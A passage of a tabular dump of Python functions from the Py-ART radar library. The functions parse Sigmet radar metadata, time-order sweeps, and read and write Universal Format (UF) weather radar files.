    azimuth['data'] = az_data
    elevation = filemetadata('elevation')
    el0 = sigmet_metadata[first_data_type]['elevation_0']
    el1 = sigmet_metadata[first_data_type]['elevation_1']
    elevation['data'] = mean_of_two_angles_deg(el0, el1).astype('float32')
    prt = filemetadata('prt')
    prt_mode = filemetadata('prt_mode')
    nyquist_velocity = filemetadata('nyquist_velocity')
    unambiguous_range = filemetadata('unambiguous_range')
    beam_width_h = filemetadata('radar_beam_width_h')
    beam_width_v = filemetadata('radar_beam_width_v')
    pulse_width = filemetadata('pulse_width')
    prt_ratio = filemetadata('prt_ratio')
    prt_value = 1.0 / sigmetfile.product_hdr['product_end']['prf']
    prt['data'] = prt_value * np.ones(total_rays, dtype='float32')
    ur_value = SPEED_OF_LIGHT * prt_value / 2.0
    unambiguous_range['data'] = ur_value * np.ones(total_rays, dtype='float32')
    multi_prf_flag = task_config['task_dsp_info']['multi_prf_flag']
    prf_multiplier = [1, 2, 3, 4][multi_prf_flag]
    if prf_multiplier != 1:
        prt_mode['data'] = np.array(nsweeps * ['dual'], dtype='S')
        ratio = (prf_multiplier + 1) / prf_multiplier
        prt_ratio['data'] = ratio * np.ones(total_rays, dtype='float32')
    else:
        prt_mode['data'] = np.array(nsweeps * ['fixed'], dtype='S')
        prt_ratio['data'] = np.ones(total_rays, dtype='float32')
    wavelength_cm = sigmetfile.product_hdr['product_end']['wavelength']
    nv_value = wavelength_cm / (10000.0 * 4.0 * prt_value) * prf_multiplier
    nyquist_velocity['data'] = nv_value * np.ones(total_rays, dtype='float32')
    beam_width_h['data'] = np.array([bin4_to_angle(task_config['task_misc_info']['horizontal_beamwidth'])], dtype='float32')
    beam_width_v['data'] = np.array([bin4_to_angle(task_config['task_misc_info']['vertical_beamwidth'])], dtype='float32')
    pulse_width['data'] = np.array([task_config['task_dsp_info']['pulse_width'] * 1e-08] * len(time['data']), dtype='float32')
    instrument_parameters = {'unambiguous_range': unambiguous_range, 'prt_mode': prt_mode, 'prt': prt, 'prt_ratio': prt_ratio, 'nyquist_velocity': nyquist_velocity, 'radar_beam_width_h': beam_width_h, 'radar_beam_width_v': beam_width_v, 'pulse_width': pulse_width}
    if prf_multiplier != 1:
        prf_flag = filemetadata('prf_flag')
        prf_flag['data'] = sigmet_metadata[first_data_type]['prf_flag']
        instrument_parameters['prf_flag'] = prf_flag
    extended_header_params = {}
    if noaa_hh_hdr is None:
        type_mask = task_config['task_dsp_info']['current_data_type_mask']
        htype = type_mask['extended_header_type']
        if full_xhdr and htype == 2 and (sigmet_data['XHDR_FULL'][0, 3] == 136):
            noaa_hh_hdr = True
        else:
            noaa_hh_hdr = False
    if noaa_hh_hdr:
        t = _sigmet_noaa_hh._decode_noaa_hh_hdr(sigmet_data['XHDR_FULL'], filemetadata, azimuth, elevation)
        (latitude, longitude, altitude, extended_header_params) = t
        metadata['platform_type'] = 'aircraft'
        noaa_hh_scan_modes = {4: 'ppi', 7: 'rhi'}
        scan_mode = task_config['task_scan_info']['antenna_scan_mode']
        if scan_mode not in noaa_hh_scan_modes:
            warnings.warn(""Unknown antenna_scan_mode, defaulting to 'rhi'."")
            scan_type = 'rhi'
        else:
            scan_type = noaa_hh_scan_modes[scan_mode]
    sweep_mode = filemetadata('sweep_mode')
    if scan_type == 'ppi':
        sweep_mode['data'] = np.array(nsweeps * ['azimuth_surveillance'], dtype='S')
    else:
        sweep_mode['data'] = np.array(nsweeps * ['rhi'], dtype='S')
    return Radar(time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, instrument_parameters=instrument_parameters, **extended_header_params)"
ARM-DOE/pyart,_is_time_ordered_by_reversal,"def _is_time_ordered_by_reversal(data, metadata, rays_per_sweep):
    """"""
    Returns if volume can be time ordered by reversing some or all sweeps.
    True if the volume can be time ordered, False if not.
    """"""
    if 'XHDR' in data:
        ref_time = data['XHDR'].copy()
        ref_time.shape = ref_time.shape[:-1]
    else:
        ref_time = metadata[list(metadata.keys())[0]]['time'].astype('int32')
    start = 0
    for nrays in rays_per_sweep:
        if nrays == 0 or nrays == 1:
            continue
        s = slice(start, start + nrays)
        start += nrays
        sweep_time_diff = np.diff(ref_time[s])
        if np.all(sweep_time_diff >= 0) or np.all(sweep_time_diff <= 0):
            continue
        else:
            return False
    return True"
ARM-DOE/pyart,_is_time_ordered_by_roll,"def _is_time_ordered_by_roll(data, metadata, rays_per_sweep):
    """"""
    Returns if volume can be time ordered by rolling some or all sweeps.
    True if the volume can be time ordered, False if not.
    """"""
    if 'XHDR' in data:
        ref_time = data['XHDR'].copy()
        ref_time.shape = ref_time.shape[:-1]
    else:
        ref_time = metadata[metadata.keys()[0]]['time'].astype('int32')
    start = 0
    for nrays in rays_per_sweep:
        if nrays == 0 or nrays == 1:
            continue
        s = slice(start, start + nrays)
        first = ref_time[start]
        last = ref_time[start + nrays - 1]
        start += nrays
        sweep_time_diff = np.diff(ref_time[s])
        count = np.count_nonzero(sweep_time_diff < 0)
        if first - last < 0:
            count += 1
        if count != 0 and count != 1:
            return False
    return True"
ARM-DOE/pyart,_is_time_ordered_by_reverse_roll,"def _is_time_ordered_by_reverse_roll(data, metadata, rays_per_sweep):
    """"""
    Returns if volume can be time ordered by reversing and rolling some or all
    sweeps. True if the volume can be time ordered, False if not.
    """"""
    if 'XHDR' in data:
        ref_time = data['XHDR'].copy()
        ref_time.shape = ref_time.shape[:-1]
    else:
        ref_time = metadata[metadata.keys()[0]]['time'].astype('int32')
    start = 0
    for nrays in rays_per_sweep:
        if nrays == 0 or nrays == 1:
            continue
        s = slice(start, start + nrays)
        first = ref_time[start]
        last = ref_time[start + nrays - 1]
        start += nrays
        sweep_time_diff = np.diff(ref_time[s])
        if sweep_time_diff.min() < 0:
            sweep_time_diff = np.diff(ref_time[s][::-1])
            (first, last) = (last, first)
        count = np.count_nonzero(sweep_time_diff < 0)
        if first - last < 0:
            count += 1
        if count != 0 and count != 1:
            return False
    return True"
ARM-DOE/pyart,_time_order_data_and_metadata_roll,"def _time_order_data_and_metadata_roll(data, metadata, rays_per_sweep):
    """"""
    Put Sigmet data and metadata in time increasing order using a roll
    operation.
    """"""
    if 'XHDR' in data:
        ref_time = data['XHDR'].copy()
        ref_time.shape = ref_time.shape[:-1]
    else:
        ref_time = metadata[metadata.keys()[0]]['time'].astype('int32')
    start = 0
    for nrays in rays_per_sweep:
        if nrays == 0 or nrays == 1:
            continue
        s = slice(start, start + nrays)
        start += nrays
        sweep_time = ref_time[s]
        sweep_time_diff = np.diff(sweep_time)
        if sweep_time_diff.min() >= 0:
            continue
        shift = -(sweep_time_diff.argmin() + 1)
        for field in data.keys():
            data[field][s] = np.roll(data[field][s], shift, axis=0)
            field_metadata = metadata[field]
            for key in field_metadata.keys():
                field_metadata[key][s] = np.roll(field_metadata[key][s], shift)
    return"
ARM-DOE/pyart,_time_order_data_and_metadata_reverse,"def _time_order_data_and_metadata_reverse(data, metadata, rays_per_sweep):
    """"""
    Put Sigmet data and metadata in time increasing order by reverse sweep in
    time reversed order.
    """"""
    if 'XHDR' in data:
        ref_time = data['XHDR'].copy()
        ref_time.shape = ref_time.shape[:-1]
    else:
        ref_time = metadata[metadata.keys()[0]]['time'].astype('int32')
    start = 0
    for nrays in rays_per_sweep:
        if nrays == 0 or nrays == 1:
            continue
        s = slice(start, start + nrays)
        start += nrays
        sweep_time = ref_time[s]
        sweep_time_diff = np.diff(sweep_time)
        if sweep_time_diff.min() >= 0:
            continue
        for field in data.keys():
            data[field][s] = data[field][s][::-1]
            field_metadata = metadata[field]
            for key in field_metadata.keys():
                field_metadata[key][s] = field_metadata[key][s][::-1]
    return"
ARM-DOE/pyart,_time_order_data_and_metadata_full,"def _time_order_data_and_metadata_full(data, metadata, rays_per_sweep):
    """"""
    Put Sigmet data and metadata in time increasing order by sorting the
    times.
    """"""
    if 'XHDR' in data:
        ref_time = data['XHDR'].copy()
        ref_time.shape = ref_time.shape[:-1]
    else:
        ref_time = metadata[metadata.keys()[0]]['time'].astype('int32')
    start = 0
    for nrays in rays_per_sweep:
        if nrays == 0 or nrays == 1:
            continue
        s = slice(start, start + nrays)
        start += nrays
        sweep_time = ref_time[s]
        sweep_time_diff = np.diff(ref_time[s])
        if sweep_time_diff.min() >= 0:
            continue
        sort_idx = np.argsort(sweep_time, kind='mergesort')
        for field in data.keys():
            data[field][s] = data[field][s][sort_idx]
            field_metadata = metadata[field]
            for key in field_metadata.keys():
                field_metadata[key][s] = field_metadata[key][s][sort_idx]
    return"
ARM-DOE/pyart,ymds_time_to_datetime,"def ymds_time_to_datetime(ymds):
    """"""Return a datetime object from a Sigmet ymds_time dictionary.""""""
    dt = datetime.datetime(ymds['year'], ymds['month'], ymds['day'])
    microsec = 1000.0 * (ymds['milliseconds'] & 1023)
    delta = datetime.timedelta(seconds=ymds['seconds'], microseconds=microsec)
    return dt + delta"
ARM-DOE/pyart,read_uf,"def read_uf(filename, field_names=None, additional_metadata=None, file_field_names=False, exclude_fields=None, include_fields=None, delay_field_loading=False, **kwargs):
    """"""
    Read a UF File.

    Parameters
    ----------
    filename : str or file-like
        Name of Universal format file to read data from.
    field_names : dict, optional
        Dictionary mapping UF data type names to radar field names. If a
        data type found in the file does not appear in this dictionary or has
        a value of None it will not be placed in the radar.fields dictionary.
        A value of None, the default, will use the mapping defined in the
        Py-ART configuration file.
    additional_metadata : dict of dicts, optional
        Dictionary of dictionaries to retrieve metadata from during this read.
        This metadata is not used during any successive file reads unless
        explicitly included. A value of None, the default, will not
        introduce any addition metadata and the file specific or default
        metadata as specified by the Py-ART configuration file will be used.
    file_field_names : bool, optional
        True to force the use of the field names from the file in which
        case the `field_names` parameter is ignored. False will use to
        `field_names` parameter to rename fields.
    exclude_fields : list or None, optional
        List of fields to exclude from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields specified by include_fields.
    include_fields : list or None, optional
        List of fields to include from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields not specified by exclude_fields.
    delay_field_loading : bool
        This option is not implemented in the function but included for
        compatibility.

    Returns
    -------
    radar : Radar
        Radar object.

    """"""
    _test_arguments(kwargs)
    filemetadata = FileMetadata('uf', field_names, additional_metadata, file_field_names, exclude_fields, include_fields)
    ufile = UFFile(prepare_for_read(filename))
    first_ray = ufile.rays[0]
    dts = ufile.get_datetimes()
    units = make_time_unit_str(min(dts))
    time = filemetadata('time')
    time['units'] = units
    time['data'] = date2num(dts, units).astype('float32')
    _range = filemetadata('range')
    field_header = first_ray.field_headers[0]
    ngates = field_header['nbins']
    step = field_header['range_spacing_m']
    start = field_header['range_start_km'] * 1000.0 + field_header['range_start_m'] + step / 2.0
    _range['data'] = np.arange(ngates, dtype='float32') * step + start
    _range['meters_to_center_of_first_gate'] = start
    _range['meters_between_gates'] = step
    latitude = filemetadata('latitude')
    longitude = filemetadata('longitude')
    altitude = filemetadata('altitude')
    (lat, lon, height) = first_ray.get_location()
    latitude['data'] = np.array([lat], dtype='float64')
    longitude['data'] = np.array([lon], dtype='float64')
    altitude['data'] = np.array([height], dtype='float64')
    metadata = filemetadata('metadata')
    metadata['original_container'] = 'UF'
    metadata['site_name'] = first_ray.mandatory_header['site_name']
    metadata['radar_name'] = first_ray.mandatory_header['radar_name']
    sweep_start_ray_index = filemetadata('sweep_start_ray_index')
    sweep_end_ray_index = filemetadata('sweep_end_ray_index')
    sweep_start_ray_index['data'] = ufile.first_ray_in_sweep
    sweep_end_ray_index['data'] = ufile.last_ray_in_sweep
    sweep_number = filemetadata('sweep_number')
    sweep_number['data'] = np.arange(ufile.nsweeps, dtype='int32')
    scan_type = _get_scan_type(first_ray)
    sweep_mode = filemetadata('sweep_mode')
    sweep_mode['data'] = np.array(ufile.nsweeps * [_SWEEP_MODE_STR[scan_type]], dtype='S')
    elevation = filemetadata('elevation')
    elevation['data'] = ufile.get_elevations()
    azimuth = filemetadata('azimuth')
    azimuth['data'] = ufile.get_azimuths()
    fixed_angle = filemetadata('fixed_angle')
    fixed_angle['data'] = ufile.get_sweep_fixed_angles()
    fields = {}
    for (uf_field_number, uf_field_dic) in enumerate(first_ray.field_positions):
        uf_field_name = uf_field_dic['data_type'].decode('ascii')
        field_name = filemetadata.get_field_name(uf_field_name)
        if field_name is None:
            continue
        field_dic = filemetadata(field_name)
        field_dic['data'] = ufile.get_field_data(uf_field_number)
        field_dic['_FillValue'] = get_fillvalue()
        fields[field_name] = field_dic
    instrument_parameters = _get_instrument_parameters(ufile, filemetadata)
    scan_rate = filemetadata('scan_rate')
    scan_rate['data'] = ufile.get_sweep_rates()
    ufile.close()
    return Radar(time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, scan_rate=scan_rate, instrument_parameters=instrument_parameters)"
ARM-DOE/pyart,_get_scan_type,"def _get_scan_type(ufray):
    """"""Ruturn the scan type of a UF ray.""""""
    uf_sweep_mode = ufray.mandatory_header['sweep_mode']
    if uf_sweep_mode in _UF_SWEEP_MODES:
        return _UF_SWEEP_MODES[uf_sweep_mode]
    else:
        warnings.warn('Unknown sweep mode, defaulting to ppi')
        return 'ppi'"
ARM-DOE/pyart,_get_instrument_parameters,"def _get_instrument_parameters(ufile, filemetadata):
    """"""Return a dictionary containing instrument parameters.""""""
    pulse_width = filemetadata('pulse_width')
    pulse_width['data'] = ufile.get_pulse_widths() / _LIGHT_SPEED
    first_ray = ufile.rays[0]
    field_header = first_ray.field_headers[0]
    beam_width_h = field_header['beam_width_h'] / 64.0
    beam_width_v = field_header['beam_width_v'] / 64.0
    bandwidth = field_header['bandwidth'] / 16.0 * 1000000.0
    wavelength_cm = field_header['wavelength_cm'] / 64.0
    if wavelength_cm == 0:
        warnings.warn('Invalid wavelength, frequency set to default value.')
        wavelength_hz = 9999.0
    else:
        wavelength_hz = _LIGHT_SPEED / (wavelength_cm / 100.0)
    radar_beam_width_h = filemetadata('radar_beam_width_h')
    radar_beam_width_h['data'] = np.array([beam_width_h], dtype='float32')
    radar_beam_width_v = filemetadata('radar_beam_width_v')
    radar_beam_width_v['data'] = np.array([beam_width_v], dtype='float32')
    radar_receiver_bandwidth = filemetadata('radar_receiver_bandwidth')
    radar_receiver_bandwidth['data'] = np.array([bandwidth], dtype='float32')
    polarization_mode = filemetadata('polarization_mode')
    polarization_mode['data'] = ufile.get_sweep_polarizations()
    frequency = filemetadata('frequency')
    frequency['data'] = np.array([wavelength_hz], dtype='float32')
    prt = filemetadata('prt')
    prt['data'] = ufile.get_prts() / 1000000.0
    instrument_parameters = {'pulse_width': pulse_width, 'radar_beam_width_h': radar_beam_width_h, 'radar_beam_width_v': radar_beam_width_v, 'radar_receiver_bandwidth': radar_receiver_bandwidth, 'polarization_mode': polarization_mode, 'frequency': frequency, 'prt': prt}
    nyquist_velocity = filemetadata('nyquist_velocity')
    nyquist_velocity['data'] = ufile.get_nyquists()
    if nyquist_velocity['data'] is not None:
        instrument_parameters['nyquist_velocity'] = nyquist_velocity
    return instrument_parameters"
ARM-DOE/pyart,write_uf,"def write_uf(filename, radar, uf_field_names=None, radar_field_names=False, exclude_fields=None, field_write_order=None, volume_start=None, templates_extra=None):
    """"""
    Write a Radar object to a UF file.

    Create a UF file containing data from the provided radar instance.
    The UF file will contain instrument parameters from the following
    dictionaries if they contained in radar.instrument_parameters:

        * radar_beam_width_h
        * radar_beam_width_v
        * radar_receiver_bandwidth
        * frequency
        * pulse_width
        * prt
        * polarization_mode
        * nyquist_velocity

    If any of these parameter are not present a default or sentinel value
    will be written in the UF file in the place of the parameter. This is also
    true for the data in the scan_rate attribute.

    Radar fields will be scaled and rounded to integer values when writing to
    UF files. The scale factor for each field can be specified in the
    `_UF_scale_factor` key for each field dictionary. If not specified the
    default scaling (100) will be used.

    Parameters
    ----------
    filename : str or file-like object.
        Filename of UF file to create. If a file-like object is specified
        data will be written using the write method.
    radar : Radar
        Radar object from which to create UF file.
    uf_field_names : dict or None, optional
        Mapping between radar fields and two character UF data type names.
        Field names mapped to None or with no mapping will be excluded from
        writing. If None, the default mappings for UF files will be used.
    radar_field_names : bool, optional
        True to use the radar field names as the field names of the UF
        fields. False to use the uf_field_names mapping to generate UF field
        names. The `exclude_fields` argument can still be used to exclude
        fields from the UF file when this parameter is True. When reading a UF
        file using `file_field_names=True` set this parameter to True to write
        a UF file with the same field names.
    exclude_fields : list or None, optional
        List of radar fields to exclude from writing.
    field_write_order : list or None, optional
        Order in which radar fields should be written out in the UF file.
        None, the default, will determine a valid order automatically.
    volume_start : datetime, optional
        Start of volume used to set UF volume structure elements.
    templates_extra : dict of dict or None
        Advanced usage parameter for setting UF structure templates.
        Elements defined in dictionaries with keys 'mandatory_header',
        'optional_header', and 'field_header' will be used to build the
        structure template.

    """"""
    if hasattr(filename, 'write'):
        fhandle = filename
        close = False
    else:
        fhandle = open(filename, 'wb')
        close = True
    field_mapping = _find_field_mapping(radar, uf_field_names, radar_field_names, exclude_fields)
    if field_write_order is None:
        field_write_order = list(field_mapping.keys())
    raycreator = UFRayCreator(radar, field_mapping, field_write_order, volume_start=volume_start, templates_extra=templates_extra)
    for ray_num in range(radar.nrays):
        ray_bytes = raycreator.make_ray(ray_num)
        pad = struct.pack(b'>i', raycreator.record_length * 2)
        fhandle.write(pad)
        fhandle.write(ray_bytes)
        fhandle.write(pad)
    if close:
        fhandle.close()
    return"
ARM-DOE/pyart,_find_field_mapping,"def _find_field_mapping(radar, uf_field_names, radar_field_names, exclude_fields):
    """"""Return a dictionary mapping radar fields to UF data types.""""""
    if uf_field_names is None:
        uf_field_names = get_field_mapping('write_uf')
    if exclude_fields is None:
        exclude_fields = []
    field_mapping = {}
    for radar_field in radar.fields.keys():
        if radar_field in exclude_fields:
            continue
        if radar_field_names:
            data_type = radar_field
        else:
            if radar_field not in uf_field_names:
                continue
            data_type = uf_field_names[radar_field]
        if data_type is None:
            continue
        field_mapping[radar_field] = data_type
    return field_mapping"
ARM-DOE/pyart,_d_to_dms,"def _d_to_dms(in_deg):
    """"""Degrees to degree, minutes, seconds.""""""
    epsilon = 0.01 / 3600.0
    in_deg += epsilon * np.sign(in_deg)
    (remain, degrees) = math.modf(in_deg)
    (remain, minutes) = math.modf(remain * 60.0)
    (remain, seconds) = math.modf(remain * 60.0)
    return (degrees, minutes, seconds)"
ARM-DOE/pyart,_pack_structure,"def _pack_structure(dic, structure):
    """"""Pack a structure from a dictionary.""""""
    fmt = '>' + ''.join([i[1] for i in structure])
    values = [dic[i[0]] for i in structure]
    fmt = str(fmt)
    return struct.pack(fmt, *values)"
ARM-DOE/pyart,__init__,"def __init__(self, radar, field_mapping, field_write_order, volume_start=None, templates_extra=None):
    """"""Initialize the object.""""""
    self.radar = radar
    self.field_mapping = field_mapping
    self.field_write_order = field_write_order
    self.record_length = self._calc_record_length(radar, field_mapping, field_write_order)
    self.ray_num_to_sweep_num = self._calc_ray_num_to_sweep_num(radar)
    self.mandatory_header_template = UF_MANDATORY_HEADER_TEMPLATE.copy()
    self.optional_header_template = UF_OPTIONAL_HEADER_TEMPLATE.copy()
    self.field_header_template = UF_FIELD_HEADER_TEMPLATE.copy()
    self._set_mandatory_header_location()
    self._set_optional_header_time(volume_start)
    self._set_field_header()
    if templates_extra is not None:
        self._parse_custom_templates(templates_extra)
    return"
ARM-DOE/pyart,_calc_ray_num_to_sweep_num,"@staticmethod
def _calc_ray_num_to_sweep_num(radar):
    """"""Return an array mapping ray number to sweep numbers.""""""
    ray_num_to_sweep_num = np.zeros((radar.nrays,), dtype='int32')
    for (isweep, sweep_slice) in enumerate(radar.iter_slice()):
        ray_num_to_sweep_num[sweep_slice] = isweep
    return ray_num_to_sweep_num"
ARM-DOE/pyart,_calc_record_length,"@staticmethod
def _calc_record_length(radar, field_mapping, field_write_order):
    """"""Return the record length in 2-byte words.""""""
    nfields = len(field_write_order)
    data_types = [field_mapping[field].encode('ascii') for field in field_write_order]
    nvel = sum((data_type in UF_VEL_DATA_TYPES for data_type in data_types))
    return 45 + 14 + 3 + (radar.ngates + 2 + 19) * nfields + 2 * nvel"
ARM-DOE/pyart,_set_optional_header_time,"def _set_optional_header_time(self, volume_start):
    """"""Populate the optional header template with the volume start.""""""
    header = self.optional_header_template
    if volume_start is None:
        volume_start = num2date(self.radar.time['data'][0], self.radar.time['units'])
    header['volume_hour'] = volume_start.hour
    header['volume_minute'] = volume_start.minute
    header['volume_second'] = volume_start.second"
ARM-DOE/pyart,_set_mandatory_header_location,"def _set_mandatory_header_location(self):
    """"""Populate the mandatory header template with the location.""""""
    header = self.mandatory_header_template
    (degrees, minutes, seconds) = _d_to_dms(self.radar.latitude['data'][0])
    header['latitude_degrees'] = int(degrees)
    header['latitude_minutes'] = int(minutes)
    header['latitude_seconds'] = int(seconds * 64)
    (degrees, minutes, seconds) = _d_to_dms(self.radar.longitude['data'][0])
    header['longitude_degrees'] = int(degrees)
    header['longitude_minutes'] = int(minutes)
    header['longitude_seconds'] = int(seconds * 64)
    header['height_above_sea_level'] = int(self.radar.altitude['data'][0])
    return"
ARM-DOE/pyart,_set_field_header,"def _set_field_header(self):
    """"""Populate the field header template with radar parameters.""""""
    header = self.field_header_template
    range_step = self.radar.range['meters_between_gates']
    range_start = self.radar.range['meters_to_center_of_first_gate']
    range_start -= range_step / 2.0
    (range_start_km, range_start_m) = divmod(range_start, 1000)
    if isinstance(range_start_m, np.ndarray):
        range_start_m = range_start_m[0]
    if isinstance(range_step, np.ndarray):
        range_step = range_step[0]
    header['range_start_km'] = int(range_start_km)
    header['range_start_m'] = int(round(range_start_m))
    header['range_spacing_m'] = int(round(range_step))
    iparams = self.radar.instrument_parameters
    if iparams is not None and 'radar_beam_width_h' in iparams:
        beam_width_h = iparams['radar_beam_width_h']['data'][0]
        header['beam_width_h'] = int(round(beam_width_h * 64))
    else:
        header['beam_width_h'] = UF_MISSING_VALUE
    if iparams is not None and 'radar_beam_width_v' in iparams:
        beam_width_v = iparams['radar_beam_width_v']['data'][0]
        header['beam_width_v'] = int(round(beam_width_v * 64))
    else:
        header['beam_width_v'] = UF_MISSING_VALUE
    if iparams is not None and 'radar_receiver_bandwidth' in iparams:
        bandwidth = iparams['radar_receiver_bandwidth']['data'][0]
        header['bandwidth'] = int(round(bandwidth / 1000000.0 * 16))
    else:
        header['bandwidth'] = UF_MISSING_VALUE
    if iparams is not None and 'frequency' in iparams:
        frequency = iparams['frequency']['data'][0]
        header['wavelength_cm'] = int(round(_LIGHT_SPEED / frequency * 100 * 64))
    else:
        header['wavelength_cm'] = UF_MISSING_VALUE
    return"
ARM-DOE/pyart,_parse_custom_templates,"def _parse_custom_templates(self, templates_extra):
    """"""Set additional template parameter using provided dictionary.""""""
    if 'mandatory_header' in templates_extra:
        for (key, value) in templates_extra['mandatory_header'].items():
            self.mandatory_header_template[key] = value
    if 'optional_header' in templates_extra:
        for (key, value) in templates_extra['optional_header'].items():
            self.optional_header_template[key] = value
    if 'field_header' in templates_extra:
        for (key, value) in templates_extra['field_header'].items():
            self.field_header_template[key] = value
    return"
ARM-DOE/pyart,make_ray,"def make_ray(self, ray_num):
    """"""Return a byte string representing a complete UF ray.""""""
    ray = self.make_mandatory_header(ray_num)
    ray += self.make_optional_header()
    ray += self.make_data_header()
    field_positions = self.make_field_position_list()
    ray += self.make_field_position()
    for field_info in field_positions:
        data_type = field_info['data_type']
        offset = field_info['offset_field_header'] + 19
        radar_field = field_info['radar_field']
        if '_UF_scale_factor' in self.radar.fields[radar_field]:
            scale = self.radar.fields[radar_field]['_UF_scale_factor']
        else:
            scale = UF_DEFAULT_SCALE_FACTOR
        if data_type in UF_VEL_DATA_TYPES:
            offset += 2
            vel_header = self.make_fsi_vel(ray_num, scale)
        else:
            vel_header = b''
        field_header = self.make_field_header(offset, ray_num, scale)
        data_array = self.make_data_array(radar_field, ray_num, scale)
        ray += field_header
        ray += vel_header
        ray += data_array.tobytes()
    return ray"
ARM-DOE/pyart,make_mandatory_header,"def make_mandatory_header(self, ray_num):
    """"""Return a byte string representing a UF mandatory header.""""""
    ray_time = num2date(self.radar.time['data'][ray_num], self.radar.time['units'])
    header = self.mandatory_header_template
    header['year'] = ray_time.year - 2000
    header['month'] = ray_time.month
    header['day'] = ray_time.day
    header['hour'] = ray_time.hour
    header['minute'] = ray_time.minute
    header['second'] = ray_time.second
    sweep_num = self.ray_num_to_sweep_num[ray_num]
    header['record_number'] = header['ray_number'] = ray_num + 1
    header['sweep_number'] = sweep_num + 1
    azimuth = self.radar.azimuth['data'][ray_num]
    header['azimuth'] = int(round(azimuth * 64))
    elevation = self.radar.elevation['data'][ray_num]
    header['elevation'] = int(round(elevation * 64))
    fixed_angle = self.radar.fixed_angle['data'][sweep_num]
    header['fixed_angle'] = int(round(fixed_angle * 64))
    if self.radar.scan_rate is not None:
        scan_rate = self.radar.scan_rate['data'][ray_num]
    else:
        scan_rate = UF_MISSING_VALUE / 64
    header['sweep_rate'] = int(round(scan_rate * 64))
    if self.radar.scan_type in UF_SWEEP_MODES:
        sweep_mode_number = UF_SWEEP_MODES[self.radar.scan_type]
    else:
        warnings.warn('Unknown scan_type: %s, defaulting to PPI' % self.radar.scan_type)
        sweep_mode_number = UF_SWEEP_MODES['ppi']
    header['sweep_mode'] = sweep_mode_number
    header['record_length'] = self.record_length
    return _pack_structure(header, UF_MANDATORY_HEADER)"
ARM-DOE/pyart,make_optional_header,"def make_optional_header(self):
    """"""Return a byte string representing a UF optional header.""""""
    header = self.optional_header_template
    return _pack_structure(header, UF_OPTIONAL_HEADER)"
ARM-DOE/pyart,make_data_header,"def make_data_header(self):
    """"""Return a byte string representing a UF data header.""""""
    header = UF_DATA_HEADER_TEMPLATE.copy()
    nfields = len(self.field_write_order)
    header['ray_nfields'] = nfields
    header['record_nfields'] = nfields
    return _pack_structure(header, UF_DATA_HEADER)"
ARM-DOE/pyart,make_field_position_list,"def make_field_position_list(self):
    """"""Return a list of field position dictionaries.""""""
    offset = 62 + len(self.field_write_order) * 2 + 1
    field_positions = []
    for radar_field in self.field_write_order:
        data_type = self.field_mapping[radar_field].encode('ascii')
        field_position = UF_FIELD_POSITION_TEMPLATE.copy()
        field_position['data_type'] = data_type
        field_position['offset_field_header'] = offset
        field_position['radar_field'] = radar_field
        field_positions.append(field_position)
        offset += self.radar.ngates + 19
        if data_type in UF_VEL_DATA_TYPES:
            offset += 2
    return field_positions"
ARM-DOE/pyart,make_field_position,"def make_field_position(self):
    """"""Return a byte string representing the UF field positions.""""""
    fps = self.make_field_position_list()
    return b''.join([_pack_structure(fp, UF_FIELD_POSITION) for fp in fps])"
ARM-DOE/pyart,make_field_header,"def make_field_header(self, data_offset, ray_num, scale_factor):
    """"""Return a byte string representing a field header.""""""
    field_header = self.field_header_template
    field_header['nbins'] = self.radar.ngates
    field_header['data_offset'] = data_offset
    field_header['scale_factor'] = scale_factor
    iparams = self.radar.instrument_parameters
    if iparams is not None and 'pulse_width' in iparams:
        pulse_width = iparams['pulse_width']['data'][ray_num]
        field_header['pulse_width_m'] = int(round(pulse_width * _LIGHT_SPEED))
    else:
        field_header['pulse_width_m'] = UF_MISSING_VALUE
    if iparams is not None and 'prt' in iparams:
        prt = iparams['prt']['data'][ray_num]
        field_header['prt_ms'] = int(round(prt * 1000000.0))
    else:
        field_header['prt_ms'] = UF_MISSING_VALUE
    field_header['polarization'] = 1
    sweep_num = self.ray_num_to_sweep_num[ray_num]
    if iparams is not None and 'polarization_mode' in iparams:
        mode = str(iparams['polarization_mode']['data'][sweep_num])
        if mode in POLARIZATION_STR:
            field_header['polarization'] = POLARIZATION_STR.index(mode)
    return _pack_structure(field_header, UF_FIELD_HEADER)"
ARM-DOE/pyart,make_fsi_vel,"def make_fsi_vel(self, ray_num, scale):
    """"""Return a byte string representing a UF FSI velocity structure.""""""
    fsi_vel = UF_FSI_VEL_TEMPLATE.copy()
    iparams = self.radar.instrument_parameters
    if iparams is not None and 'nyquist_velocity' in iparams:
        nyquist = iparams['nyquist_velocity']['data'][ray_num]
        fsi_vel['nyquist'] = int(round(nyquist * scale))
    else:
        fsi_vel['nyquist'] = UF_MISSING_VALUE
    return _pack_structure(fsi_vel, UF_FSI_VEL)"
ARM-DOE/pyart,make_data_array,"def make_data_array(self, field, ray_num, scale=100.0):
    """"""Return an array of UF field data.""""""
    field_data = np.round(self.radar.fields[field]['data'][ray_num] * scale)
    return field_data.filled(-32768).astype('>i2')"
ARM-DOE/pyart,_structure_size,"def _structure_size(structure):
    """"""Find the size of a structure in bytes.""""""
    return struct.calcsize('>' + ''.join([i[1] for i in structure]))"
ARM-DOE/pyart,_unpack_from_buf,"def _unpack_from_buf(buf, pos, structure):
    """"""Unpack a structure from a buffer.""""""
    size = _structure_size(structure)
    return _unpack_structure(buf[pos:pos + size], structure)"
ARM-DOE/pyart,_unpack_structure,"def _unpack_structure(string, structure):
    """"""Unpack a structure from a string""""""
    fmt = '>' + ''.join([i[1] for i in structure])
    lst = struct.unpack(fmt, string)
    return dict(zip([i[0] for i in structure], lst))"
ARM-DOE/pyart,__init__,"def __init__(self, filename):
    """"""initialize.""""""
    if hasattr(filename, 'read'):
        fobj = filename
    else:
        fobj = open(filename, 'rb')
    self._fh = fobj
    buf = fobj.read(8)
    try:
        padding = buf.index(b'UF')
    except ValueError:
        raise OSError('file in not a valid UF file')
    self.rays = []
    while len(buf) == 8:
        record_size = struct.unpack('>h', buf[padding + 2:padding + 4])[0] * 2
        bytes_read = len(buf) - padding
        bytes_to_read = record_size - bytes_read
        record = buf[-bytes_read:] + fobj.read(bytes_to_read)
        self.rays.append(UFRay(record))
